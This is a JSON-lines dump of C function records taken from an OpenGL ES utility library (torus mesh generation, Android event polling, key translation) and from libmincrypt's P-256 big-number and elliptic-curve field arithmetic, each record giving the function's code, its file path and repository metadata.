{"docstring": "/*\n * @author Pablo Alonso-Villaverde Roza\n * @author Norbert Nopper\n */\n", "func_signal": "GLUSboolean GLUSAPIENTRY glusShapeCreateTorusf(GLUSshape* shape, const GLUSfloat innerRadius, const GLUSfloat outerRadius, const GLUSuint numberSlices, const GLUSuint numberStacks)", "code": "{\n    // s, t = parametric values of the equations, in the range [0,1]\n    GLUSfloat s = 0;\n    GLUSfloat t = 0;\n\n    // sIncr, tIncr are increment values aplied to s and t on each loop iteration to generate the torus\n    GLUSfloat sIncr;\n    GLUSfloat tIncr;\n\n    // to store precomputed sin and cos values\n    GLUSfloat cos2PIs, sin2PIs, cos2PIt, sin2PIt;\n\n    GLUSuint numberVertices;\n    GLUSuint numberIndices;\n\n    // used later to help us calculating tangents vectors\n    GLUSfloat helpVector[3] = { 0.0f, 1.0f, 0.0f };\n    GLUSfloat helpQuaternion[4];\n    GLUSfloat helpMatrix[16];\n\n    // indices for each type of buffer (of vertices, indices, normals...)\n    GLUSuint indexVertices, indexIndices, indexNormals, indexTangents, indexTexCoords;\n\n    // loop counters\n    GLUSuint sideCount, faceCount;\n\n    // used to generate the indices\n    GLUSuint v0, v1, v2, v3;\n\n    GLUSfloat torusRadius = (outerRadius - innerRadius) / 2.0f;\n    GLUSfloat centerRadius = outerRadius - torusRadius;\n\n    numberVertices = (numberStacks + 1) * (numberSlices + 1);\n    numberIndices = numberStacks * numberSlices * 2 * 3; // 2 triangles per face * 3 indices per triangle\n\n    if (numberSlices < 3 || numberStacks < 3 || numberVertices > GLUS_MAX_VERTICES || numberIndices > GLUS_MAX_INDICES)\n    {\n        return GLUS_FALSE;\n    }\n\n    if (!shape)\n    {\n        return GLUS_FALSE;\n    }\n    glusShapeInitf(shape);\n\n    shape->numberVertices = numberVertices;\n    shape->numberIndices = numberIndices;\n\n    shape->vertices = (GLUSfloat*) glusMemoryMalloc(4 * numberVertices * sizeof(GLUSfloat));\n    shape->normals = (GLUSfloat*) glusMemoryMalloc(3 * numberVertices * sizeof(GLUSfloat));\n    shape->tangents = (GLUSfloat*) glusMemoryMalloc(3 * numberVertices * sizeof(GLUSfloat));\n    shape->texCoords = (GLUSfloat*) glusMemoryMalloc(2 * numberVertices * sizeof(GLUSfloat));\n    shape->indices = (GLUSindex*) glusMemoryMalloc(numberIndices * sizeof(GLUSindex));\n\n    if (!glusShapeCheckf(shape))\n    {\n        glusShapeDestroyf(shape);\n\n        return GLUS_FALSE;\n    }\n\n    sIncr = 1.0f / (GLUSfloat) numberSlices;\n    tIncr = 1.0f / (GLUSfloat) numberStacks;\n\n    // generate vertices and its attributes\n    for (sideCount = 0; sideCount <= numberSlices; ++sideCount, s += sIncr)\n    {\n        // precompute some values\n        cos2PIs = (GLUSfloat) cosf(2.0f * GLUS_PI * s);\n        sin2PIs = (GLUSfloat) sinf(2.0f * GLUS_PI * s);\n\n        t = 0.0f;\n        for (faceCount = 0; faceCount <= numberStacks; ++faceCount, t += tIncr)\n        {\n            // precompute some values\n            cos2PIt = (GLUSfloat) cosf(2.0f * GLUS_PI * t);\n            sin2PIt = (GLUSfloat) sinf(2.0f * GLUS_PI * t);\n\n            // generate vertex and stores it in the right position\n            indexVertices = ((sideCount * (numberStacks + 1)) + faceCount) * 4;\n            shape->vertices[indexVertices + 0] = (centerRadius + torusRadius * cos2PIt) * cos2PIs;\n            shape->vertices[indexVertices + 1] = (centerRadius + torusRadius * cos2PIt) * sin2PIs;\n            shape->vertices[indexVertices + 2] = torusRadius * sin2PIt;\n            shape->vertices[indexVertices + 3] = 1.0f;\n\n            // generate normal and stores it in the right position\n            // NOTE: cos (2PIx) = cos (x) and sin (2PIx) = sin (x) so, we can use this formula\n            //       normal = {cos(2PIs)cos(2PIt) , sin(2PIs)cos(2PIt) ,sin(2PIt)}\n            indexNormals = ((sideCount * (numberStacks + 1)) + faceCount) * 3;\n            shape->normals[indexNormals + 0] = cos2PIs * cos2PIt;\n            shape->normals[indexNormals + 1] = sin2PIs * cos2PIt;\n            shape->normals[indexNormals + 2] = sin2PIt;\n\n            // generate texture coordinates and stores it in the right position\n            indexTexCoords = ((sideCount * (numberStacks + 1)) + faceCount) * 2;\n            shape->texCoords[indexTexCoords + 0] = s;\n            shape->texCoords[indexTexCoords + 1] = t;\n\n            // use quaternion to get the tangent vector\n            glusQuaternionRotateRzf(helpQuaternion, 360.0f * s);\n            glusQuaternionGetMatrix4x4f(helpMatrix, helpQuaternion);\n\n            indexTangents = ((sideCount * (numberStacks + 1)) + faceCount) * 3;\n\n            glusMatrix4x4MultiplyVector3f(&shape->tangents[indexTangents], helpMatrix, helpVector);\n        }\n    }\n\n    // generate indices\n    indexIndices = 0;\n    for (sideCount = 0; sideCount < numberSlices; ++sideCount)\n    {\n        for (faceCount = 0; faceCount < numberStacks; ++faceCount)\n        {\n            // get the number of the vertices for a face of the torus. They must be < numVertices\n            v0 = ((sideCount * (numberStacks + 1)) + faceCount);\n            v1 = (((sideCount + 1) * (numberStacks + 1)) + faceCount);\n            v2 = (((sideCount + 1) * (numberStacks + 1)) + (faceCount + 1));\n            v3 = ((sideCount * (numberStacks + 1)) + (faceCount + 1));\n\n            // first triangle of the face, counter clock wise winding\n            shape->indices[indexIndices++] = v0;\n            shape->indices[indexIndices++] = v1;\n            shape->indices[indexIndices++] = v2;\n\n            // second triangle of the face, counter clock wise winding\n            shape->indices[indexIndices++] = v0;\n            shape->indices[indexIndices++] = v2;\n            shape->indices[indexIndices++] = v3;\n        }\n    }\n\n    if (!glusShapeFinalizef(shape))\n    {\n        glusShapeDestroyf(shape);\n\n        return GLUS_FALSE;\n    }\n\n    return GLUS_TRUE;\n}", "path": "GLUS\\src\\glus_shape.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n", "func_signal": "GLUSvoid GLUSAPIENTRY glusVectorNCopyc(GLUScomplex* result, const GLUScomplex* vector, const GLUSint n)", "code": "{\n\tGLUSint i;\n\n\tfor (i = 0; i < n; i++)\n\t{\n\t\tresult[i] = vector[i];\n\t}\n}", "path": "GLUS\\src\\glus_vector.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "//\n", "func_signal": "GLUSvoid _glusOsPollEvents()", "code": "{\n\tint ident;\n    int events;\n    struct android_poll_source* androidPollSource;\n\n    while ((ident = ALooper_pollAll(0, NULL, &events, (void**)&androidPollSource)) >= 0)\n    {\n         if (androidPollSource != NULL)\n         {\n        \t androidPollSource->process(g_app, androidPollSource);\n         }\n    }\n\n\tint32_t orientation = AConfiguration_getOrientation (g_app->config);\n\n\tint32_t width = ANativeWindow_getWidth(g_app->window);\n\tint32_t height = ANativeWindow_getHeight(g_app->window);\n\n\tif (orientation != ACONFIGURATION_ORIENTATION_PORT)\n\t{\n\t\tint32_t temp = width;\n\n\t\twidth = height;\n\t\theight = temp;\n\t}\n\n\tif (width != g_width || height != g_height)\n\t{\n\t\tg_width = width;\n\t\tg_height = height;\n\n\t\t_glusWindowInternalReshape(g_width, g_height);\n\t}\n\n    if (g_app->destroyRequested != 0 )\n    {\n    \t_glusWindowInternalClose();\n    }\n}", "path": "GLUS\\src\\glus_os_android_es.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "/**\n * Main entry point.\n */\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n\tEGLint eglConfigAttributes[] = {\n\t        EGL_RED_SIZE, 8,\n\t        EGL_GREEN_SIZE, 8,\n\t        EGL_BLUE_SIZE, 8,\n\t        EGL_DEPTH_SIZE, 24,\n\t        EGL_RENDERABLE_TYPE, EGL_OPENGL_ES2_BIT,\n\t        EGL_NONE\n\t};\n\n    EGLint eglContextAttributes[] = {\n    \t\tEGL_CONTEXT_CLIENT_VERSION, 3,\n    \t\tEGL_NONE\n    };\n\n    glusWindowSetInitFunc(init);\n\n    glusWindowSetReshapeFunc(reshape);\n\n    glusWindowSetUpdateFunc(update);\n\n    glusWindowSetTerminateFunc(terminate);\n\n    if (!glusWindowCreate(\"GLUS Example Window\", 640, 480, GLUS_FALSE, GLUS_FALSE, eglConfigAttributes, eglContextAttributes, 0))\n    {\n        printf(\"Could not create window!\\n\");\n        return -1;\n    }\n\n    glusWindowRun();\n\n    return 0;\n}", "path": "Example01_ES\\src\\main.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "// Map, if possible, to GLFW keys\n", "func_signal": "static int glusOsTranslateKey(SDLKey key)", "code": "{\n\n\tswitch (key)\n\t{\n\t\tcase SDLK_SPACE:\n\t\t\treturn GLFW_KEY_SPACE;\n\t\tcase SDLK_ESCAPE:\n\t\t\treturn GLFW_KEY_ESCAPE;\n\t\tcase SDLK_F1:\n\t\t\treturn GLFW_KEY_F1;\n\t\tcase SDLK_F2:\n\t\t\treturn GLFW_KEY_F2;\n\t\tcase SDLK_F3:\n\t\t\treturn GLFW_KEY_F3;\n\t\tcase SDLK_F4:\n\t\t\treturn GLFW_KEY_F4;\n\t\tcase SDLK_F5:\n\t\t\treturn GLFW_KEY_F5;\n\t\tcase SDLK_F6:\n\t\t\treturn GLFW_KEY_F6;\n\t\tcase SDLK_F7:\n\t\t\treturn GLFW_KEY_F7;\n\t\tcase SDLK_F8:\n\t\t\treturn GLFW_KEY_F8;\n\t\tcase SDLK_F9:\n\t\t\treturn GLFW_KEY_F9;\n\t\tcase SDLK_F10:\n\t\t\treturn GLFW_KEY_F10;\n\t\tcase SDLK_F11:\n\t\t\treturn GLFW_KEY_F11;\n\t\tcase SDLK_F12:\n\t\t\treturn GLFW_KEY_F12;\n\t\tcase SDLK_F13:\n\t\t\treturn GLFW_KEY_F13;\n\t\tcase SDLK_F14:\n\t\t\treturn GLFW_KEY_F14;\n\t\tcase SDLK_F15:\n\t\t\treturn GLFW_KEY_F15;\n\t\tcase SDLK_UP:\n\t\t\treturn GLFW_KEY_UP;\n\t\tcase SDLK_DOWN:\n\t\t\treturn GLFW_KEY_DOWN;\n\t\tcase SDLK_LEFT:\n\t\t\treturn GLFW_KEY_LEFT;\n\t\tcase SDLK_RIGHT:\n\t\t\treturn GLFW_KEY_RIGHT;\n\t\tcase SDLK_LSHIFT:\n\t\t\treturn GLFW_KEY_LEFT_SHIFT;\n\t\tcase SDLK_RSHIFT:\n\t\t\treturn GLFW_KEY_RIGHT_SHIFT;\n\t\tcase SDLK_LCTRL:\n\t\t\treturn GLFW_KEY_LEFT_CONTROL;\n\t\tcase SDLK_RCTRL:\n\t\t\treturn GLFW_KEY_RIGHT_CONTROL;\n\t\tcase SDLK_LALT:\n\t\t\treturn GLFW_KEY_LEFT_ALT;\n\t\tcase SDLK_RALT:\n\t\t\treturn GLFW_KEY_RIGHT_ALT;\n\t\tcase SDLK_TAB:\n\t\t\treturn GLFW_KEY_TAB;\n\t\tcase SDLK_RETURN:\n\t\t\treturn GLFW_KEY_ENTER;\n\t\tcase SDLK_BACKSPACE:\n\t\t\treturn GLFW_KEY_BACKSPACE;\n\t\tcase SDLK_INSERT:\n\t\t\treturn GLFW_KEY_INSERT;\n\t\tcase SDLK_DELETE:\n\t\t\treturn GLFW_KEY_DELETE;\n\t\tcase SDLK_PAGEUP:\n\t\t\treturn GLFW_KEY_PAGE_UP;\n\t\tcase SDLK_PAGEDOWN:\n\t\t\treturn GLFW_KEY_PAGE_DOWN;\n\t\tcase SDLK_HOME:\n\t\t\treturn GLFW_KEY_HOME;\n\t\tcase SDLK_END:\n\t\t\treturn GLFW_KEY_END;\n\t\tcase SDLK_KP0:\n\t\t\treturn GLFW_KEY_KP_0;\n\t\tcase SDLK_KP1:\n\t\t\treturn GLFW_KEY_KP_1;\n\t\tcase SDLK_KP2:\n\t\t\treturn GLFW_KEY_KP_2;\n\t\tcase SDLK_KP3:\n\t\t\treturn GLFW_KEY_KP_3;\n\t\tcase SDLK_KP4:\n\t\t\treturn GLFW_KEY_KP_4;\n\t\tcase SDLK_KP5:\n\t\t\treturn GLFW_KEY_KP_5;\n\t\tcase SDLK_KP6:\n\t\t\treturn GLFW_KEY_KP_6;\n\t\tcase SDLK_KP7:\n\t\t\treturn GLFW_KEY_KP_7;\n\t\tcase SDLK_KP8:\n\t\t\treturn GLFW_KEY_KP_8;\n\t\tcase SDLK_KP9:\n\t\t\treturn GLFW_KEY_KP_9;\n\t\tcase SDLK_KP_DIVIDE:\n\t\t\treturn GLFW_KEY_KP_DIVIDE;\n\t\tcase SDLK_KP_MULTIPLY:\n\t\t\treturn GLFW_KEY_KP_MULTIPLY;\n\t\tcase SDLK_KP_MINUS:\n\t\t\treturn GLFW_KEY_KP_SUBTRACT;\n\t\tcase SDLK_KP_PLUS:\n\t\t\treturn GLFW_KEY_KP_ADD;\n\t\tcase SDLK_KP_PERIOD:\n\t\t\treturn GLFW_KEY_KP_DECIMAL;\n\t\tcase SDLK_KP_EQUALS:\n\t\t\treturn GLFW_KEY_KP_EQUAL;\n\t\tcase SDLK_KP_ENTER:\n\t\t\treturn GLFW_KEY_KP_ENTER;\n\t\tcase SDLK_NUMLOCK:\n\t\t\treturn GLFW_KEY_NUM_LOCK;\n\t\tcase SDLK_CAPSLOCK:\n\t\t\treturn GLFW_KEY_CAPS_LOCK;\n\t\tcase SDLK_SCROLLOCK:\n\t\t\treturn GLFW_KEY_SCROLL_LOCK;\n\t\tcase SDLK_PAUSE:\n\t\t\treturn GLFW_KEY_PAUSE;\n\t\tcase SDLK_LSUPER:\n\t\t\treturn GLFW_KEY_LEFT_SUPER;\n\t\tcase SDLK_RSUPER:\n\t\t\treturn GLFW_KEY_RIGHT_SUPER;\n\t\tcase SDLK_MENU:\n\t\t\treturn GLFW_KEY_MENU;\n\t\tdefault:\n\t\t\treturn (int)key;\n\t}\n\n\treturn GLFW_KEY_UNKNOWN;\n}", "path": "GLUS\\src\\glus_os_linux_raspberrypi_es.c", "repo_name": "McNopper/OpenGL_ES", "stars": 171, "license": "None", "language": "c", "size": 230542}
{"docstring": "// Return -1, 0, 1 for a < b, a == b or a > b respectively.\n", "func_signal": "int p256_cmp(const p256_int* a, const p256_int* b)", "code": "{\n  int i;\n  p256_sddigit borrow = 0;\n  p256_digit notzero = 0;\n\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    borrow += (p256_sddigit)P256_DIGIT(a, i) - P256_DIGIT(b, i);\n    // Track whether any result digit is ever not zero.\n    // Relies on !!(non-zero) evaluating to 1, e.g., !!(-1) evaluating to 1.\n    notzero |= !!((p256_digit)borrow);\n    borrow >>= P256_BITSPERDIGIT;\n  }\n  return (int)borrow | notzero;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* copy_conditional sets out=in if mask = 0xffffffff in constant time.\n *\n * On entry: mask is either 0 or 0xffffffff. */\n", "func_signal": "static void copy_conditional(felem out, const felem in, limb mask)", "code": "{\n  int i;\n\n  for (i = 0; i < NLIMBS; i++) {\n    const limb tmp = mask & (in[i] ^ out[i]);\n    out[i] ^= tmp;\n  }\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_mul sets out=in*in2.\n *\n * On entry: in[0,2,...] < 2**30, in[1,3,...] < 2**29 and\n *           in2[0,2,...] < 2**30, in2[1,3,...] < 2**29.\n * On exit: out[0,2,...] < 2**30, out[1,3,...] < 2**29. */\n", "func_signal": "static void felem_mul(felem out, const felem in, const felem in2)", "code": "{\n  u64 tmp[17];\n\n  tmp[0] = ((u64) in[0]) * in2[0];\n  tmp[1] = ((u64) in[0]) * (in2[1] << 0) +\n           ((u64) in[1]) * (in2[0] << 0);\n  tmp[2] = ((u64) in[0]) * (in2[2] << 0) + ((u64) in[1]) *\n           (in2[1] << 1) + ((u64) in[2]) * (in2[0] << 0);\n  tmp[3] = ((u64) in[0]) * (in2[3] << 0) + ((u64) in[1]) *\n           (in2[2] << 0) + ((u64) in[2]) * (in2[1] << 0) +\n           ((u64) in[3]) * (in2[0] << 0);\n  tmp[4] = ((u64) in[0]) * (in2[4] << 0) + ((u64) in[1]) *\n           (in2[3] << 1) + ((u64) in[2]) * (in2[2] << 0) +\n           ((u64) in[3]) * (in2[1] << 1) +\n           ((u64) in[4]) * (in2[0] << 0);\n  tmp[5] = ((u64) in[0]) * (in2[5] << 0) + ((u64) in[1]) *\n           (in2[4] << 0) + ((u64) in[2]) * (in2[3] << 0) +\n           ((u64) in[3]) * (in2[2] << 0) + ((u64) in[4]) *\n           (in2[1] << 0) + ((u64) in[5]) * (in2[0] << 0);\n  tmp[6] = ((u64) in[0]) * (in2[6] << 0) + ((u64) in[1]) *\n           (in2[5] << 1) + ((u64) in[2]) * (in2[4] << 0) +\n           ((u64) in[3]) * (in2[3] << 1) + ((u64) in[4]) *\n           (in2[2] << 0) + ((u64) in[5]) * (in2[1] << 1) +\n           ((u64) in[6]) * (in2[0] << 0);\n  tmp[7] = ((u64) in[0]) * (in2[7] << 0) + ((u64) in[1]) *\n           (in2[6] << 0) + ((u64) in[2]) * (in2[5] << 0) +\n           ((u64) in[3]) * (in2[4] << 0) + ((u64) in[4]) *\n           (in2[3] << 0) + ((u64) in[5]) * (in2[2] << 0) +\n           ((u64) in[6]) * (in2[1] << 0) +\n           ((u64) in[7]) * (in2[0] << 0);\n  /* tmp[8] has the greatest value but doesn't overflow. See logic in\n   * felem_square. */\n  tmp[8] = ((u64) in[0]) * (in2[8] << 0) + ((u64) in[1]) *\n           (in2[7] << 1) + ((u64) in[2]) * (in2[6] << 0) +\n           ((u64) in[3]) * (in2[5] << 1) + ((u64) in[4]) *\n           (in2[4] << 0) + ((u64) in[5]) * (in2[3] << 1) +\n           ((u64) in[6]) * (in2[2] << 0) + ((u64) in[7]) *\n           (in2[1] << 1) + ((u64) in[8]) * (in2[0] << 0);\n  tmp[9] = ((u64) in[1]) * (in2[8] << 0) + ((u64) in[2]) *\n           (in2[7] << 0) + ((u64) in[3]) * (in2[6] << 0) +\n           ((u64) in[4]) * (in2[5] << 0) + ((u64) in[5]) *\n           (in2[4] << 0) + ((u64) in[6]) * (in2[3] << 0) +\n           ((u64) in[7]) * (in2[2] << 0) +\n           ((u64) in[8]) * (in2[1] << 0);\n  tmp[10] = ((u64) in[2]) * (in2[8] << 0) + ((u64) in[3]) *\n            (in2[7] << 1) + ((u64) in[4]) * (in2[6] << 0) +\n            ((u64) in[5]) * (in2[5] << 1) + ((u64) in[6]) *\n            (in2[4] << 0) + ((u64) in[7]) * (in2[3] << 1) +\n            ((u64) in[8]) * (in2[2] << 0);\n  tmp[11] = ((u64) in[3]) * (in2[8] << 0) + ((u64) in[4]) *\n            (in2[7] << 0) + ((u64) in[5]) * (in2[6] << 0) +\n            ((u64) in[6]) * (in2[5] << 0) + ((u64) in[7]) *\n            (in2[4] << 0) + ((u64) in[8]) * (in2[3] << 0);\n  tmp[12] = ((u64) in[4]) * (in2[8] << 0) + ((u64) in[5]) *\n            (in2[7] << 1) + ((u64) in[6]) * (in2[6] << 0) +\n            ((u64) in[7]) * (in2[5] << 1) +\n            ((u64) in[8]) * (in2[4] << 0);\n  tmp[13] = ((u64) in[5]) * (in2[8] << 0) + ((u64) in[6]) *\n            (in2[7] << 0) + ((u64) in[7]) * (in2[6] << 0) +\n            ((u64) in[8]) * (in2[5] << 0);\n  tmp[14] = ((u64) in[6]) * (in2[8] << 0) + ((u64) in[7]) *\n            (in2[7] << 1) + ((u64) in[8]) * (in2[6] << 0);\n  tmp[15] = ((u64) in[7]) * (in2[8] << 0) +\n            ((u64) in[8]) * (in2[7] << 0);\n  tmp[16] = ((u64) in[8]) * (in2[8] << 0);\n\n  felem_reduce_degree(out, tmp);\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// c = a + b. Returns carry: 0 or 1.\n", "func_signal": "int p256_add(const p256_int* a, const p256_int* b, p256_int* c)", "code": "{\n  int i;\n  p256_ddigit carry = 0;\n\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    carry += (p256_ddigit)P256_DIGIT(a, i) + P256_DIGIT(b, i);\n    if (c) P256_DIGIT(c, i) = (p256_digit)carry;\n    carry >>= P256_BITSPERDIGIT;\n  }\n  return (int)carry;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// top, c[] += MOD[] & mask (0 or -1)\n// returns new top.\n", "func_signal": "static p256_digit addM(const p256_int* MOD,\n                       p256_digit top,\n                       p256_digit* c,\n                       p256_digit mask)", "code": "{\n  int i;\n  p256_ddigit carry = 0;\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    carry += *c;\n    carry += P256_DIGIT(MOD, i) & mask;\n    *c++ = (p256_digit)carry;\n    carry >>= P256_BITSPERDIGIT;\n  }\n  return top + (p256_digit)carry;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// c = a - b. Returns borrow: 0 or -1.\n", "func_signal": "int p256_sub(const p256_int* a, const p256_int* b, p256_int* c)", "code": "{\n  int i;\n  p256_sddigit borrow = 0;\n\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    borrow += (p256_sddigit)P256_DIGIT(a, i) - P256_DIGIT(b, i);\n    if (c) P256_DIGIT(c, i) = (p256_digit)borrow;\n    borrow >>= P256_BITSPERDIGIT;\n  }\n  return (int)borrow;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* point_to_affine converts a Jacobian point to an affine point. If the input\n * is the point at infinity then it returns (0, 0) in constant time. */\n", "func_signal": "static void point_to_affine(felem x_out, felem y_out, const felem nx,\n                            const felem ny, const felem nz)", "code": "{\n  felem z_inv, z_inv_sq;\n  felem_inv(z_inv, nz);\n  felem_square(z_inv_sq, z_inv);\n  felem_mul(x_out, nx, z_inv_sq);\n  felem_mul(z_inv, z_inv, z_inv_sq);\n  felem_mul(y_out, ny, z_inv);\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_square sets out=in*in.\n *\n * On entry: in[0,2,...] < 2**30, in[1,3,...] < 2**29.\n * On exit: out[0,2,...] < 2**30, out[1,3,...] < 2**29. */\n", "func_signal": "static void felem_square(felem out, const felem in)", "code": "{\n  u64 tmp[17];\n\n  tmp[0] = ((u64) in[0]) * in[0];\n  tmp[1] = ((u64) in[0]) * (in[1] << 1);\n  tmp[2] = ((u64) in[0]) * (in[2] << 1) +\n           ((u64) in[1]) * (in[1] << 1);\n  tmp[3] = ((u64) in[0]) * (in[3] << 1) +\n           ((u64) in[1]) * (in[2] << 1);\n  tmp[4] = ((u64) in[0]) * (in[4] << 1) +\n           ((u64) in[1]) * (in[3] << 2) + ((u64) in[2]) * in[2];\n  tmp[5] = ((u64) in[0]) * (in[5] << 1) + ((u64) in[1]) *\n           (in[4] << 1) + ((u64) in[2]) * (in[3] << 1);\n  tmp[6] = ((u64) in[0]) * (in[6] << 1) + ((u64) in[1]) *\n           (in[5] << 2) + ((u64) in[2]) * (in[4] << 1) +\n           ((u64) in[3]) * (in[3] << 1);\n  tmp[7] = ((u64) in[0]) * (in[7] << 1) + ((u64) in[1]) *\n           (in[6] << 1) + ((u64) in[2]) * (in[5] << 1) +\n           ((u64) in[3]) * (in[4] << 1);\n  /* tmp[8] has the greatest value of 2**61 + 2**60 + 2**61 + 2**60 + 2**60,\n   * which is < 2**64 as required. */\n  tmp[8] = ((u64) in[0]) * (in[8] << 1) + ((u64) in[1]) *\n           (in[7] << 2) + ((u64) in[2]) * (in[6] << 1) +\n           ((u64) in[3]) * (in[5] << 2) + ((u64) in[4]) * in[4];\n  tmp[9] = ((u64) in[1]) * (in[8] << 1) + ((u64) in[2]) *\n           (in[7] << 1) + ((u64) in[3]) * (in[6] << 1) +\n           ((u64) in[4]) * (in[5] << 1);\n  tmp[10] = ((u64) in[2]) * (in[8] << 1) + ((u64) in[3]) *\n            (in[7] << 2) + ((u64) in[4]) * (in[6] << 1) +\n            ((u64) in[5]) * (in[5] << 1);\n  tmp[11] = ((u64) in[3]) * (in[8] << 1) + ((u64) in[4]) *\n            (in[7] << 1) + ((u64) in[5]) * (in[6] << 1);\n  tmp[12] = ((u64) in[4]) * (in[8] << 1) +\n            ((u64) in[5]) * (in[7] << 2) + ((u64) in[6]) * in[6];\n  tmp[13] = ((u64) in[5]) * (in[8] << 1) +\n            ((u64) in[6]) * (in[7] << 1);\n  tmp[14] = ((u64) in[6]) * (in[8] << 1) +\n            ((u64) in[7]) * (in[7] << 1);\n  tmp[15] = ((u64) in[7]) * (in[8] << 1);\n  tmp[16] = ((u64) in[8]) * in[8];\n\n  felem_reduce_degree(out, tmp);\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// c = a * b mod MOD. c can be a and/or b.\n", "func_signal": "void p256_modmul(const p256_int* MOD,\n                 const p256_int* a,\n                 const p256_digit top_b,\n                 const p256_int* b,\n                 p256_int* c)", "code": "{\n  p256_digit tmp[P256_NDIGITS * 2 + 1] = { 0 };\n  p256_digit top = 0;\n  int i;\n\n  // Multiply/add into tmp.\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    if (i) tmp[i + P256_NDIGITS - 1] = top;\n    top = mulAdd(a, P256_DIGIT(b, i), 0, tmp + i);\n  }\n\n  // Multiply/add top digit\n  tmp[i + P256_NDIGITS - 1] = top;\n  top = mulAdd(a, top_b, 0, tmp + i);\n\n  // Reduce tmp, digit by digit.\n  for (; i >= 0; --i) {\n    p256_digit reducer[P256_NDIGITS] = { 0 };\n    p256_digit top_reducer;\n\n    // top can be any value at this point.\n    // Guestimate reducer as top * MOD, since msw of MOD is -1.\n    top_reducer = mulAdd(MOD, top, 0, reducer);\n\n    // Subtract reducer from top | tmp.\n    top = subTop(top_reducer, reducer, top, tmp + i);\n\n    // top is now either 0 or 1. Make it 0, fixed-timing.\n    assert(top <= 1);\n\n    top = subM(MOD, top, tmp + i, ~(top - 1));\n\n    assert(top == 0);\n\n    // We have now reduced the top digit off tmp. Fetch new top digit.\n    top = tmp[i + P256_NDIGITS - 1];\n  }\n\n  // tmp might still be larger than MOD, yet same bit length.\n  // Make sure it is less, fixed-timing.\n  addM(MOD, 0, tmp, subM(MOD, 0, tmp, -1));\n\n  memcpy(c, tmp, P256_NBYTES);\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_scalar_4 sets out=4*out.\n *\n * On entry: out[0,2,...] < 2**30, out[1,3,...] < 2**29.\n * On exit: out[0,2,...] < 2**30, out[1,3,...] < 2**29. */\n", "func_signal": "static void felem_scalar_4(felem out)", "code": "{\n  limb carry = 0, next_carry;\n  unsigned i;\n\n  for (i = 0;; i++) {\n    next_carry = out[i] >> 27;\n    out[i] <<= 2;\n    out[i] &= kBottom29Bits;\n    out[i] += carry;\n    carry = next_carry + (out[i] >> 29);\n    out[i] &= kBottom29Bits;\n\n    i++;\n    if (i == NLIMBS)\n      break;\n\n    next_carry = out[i] >> 26;\n    out[i] <<= 2;\n    out[i] &= kBottom28Bits;\n    out[i] += carry;\n    carry = next_carry + (out[i] >> 28);\n    out[i] &= kBottom28Bits;\n  }\n\n  felem_reduce_carry(out, carry);\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// top, c[] += a[] * b\n// Returns new top\n", "func_signal": "static p256_digit mulAdd(const p256_int* a,\n                         p256_digit b,\n                         p256_digit top,\n                         p256_digit* c)", "code": "{\n  int i;\n  p256_ddigit carry = 0;\n\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    carry += *c;\n    carry += (p256_ddigit)P256_DIGIT(a, i) * b;\n    *c++ = (p256_digit)carry;\n    carry >>= P256_BITSPERDIGIT;\n  }\n  return top + (p256_digit)carry;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_reduce_carry adds a multiple of p in order to cancel |carry|,\n * which is a term at 2**257.\n *\n * On entry: carry < 2**3, inout[0,2,...] < 2**29, inout[1,3,...] < 2**28.\n * On exit: inout[0,2,..] < 2**30, inout[1,3,...] < 2**29. */\n", "func_signal": "static void felem_reduce_carry(felem inout, limb carry)", "code": "{\n  const u32 carry_mask = NON_ZERO_TO_ALL_ONES(carry);\n\n  inout[0] += carry << 1;\n  inout[3] += 0x10000000 & carry_mask;\n  /* carry < 2**3 thus (carry << 11) < 2**14 and we added 2**28 in the\n   * previous line therefore this doesn't underflow. */\n  inout[3] -= carry << 11;\n  inout[4] += (0x20000000 - 1) & carry_mask;\n  inout[5] += (0x10000000 - 1) & carry_mask;\n  inout[6] += (0x20000000 - 1) & carry_mask;\n  inout[6] -= carry << 22;\n  /* This may underflow if carry is non-zero but, if so, we'll fix it in the\n   * next line. */\n  inout[7] -= 1 & carry_mask;\n  inout[7] += carry << 25;\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": 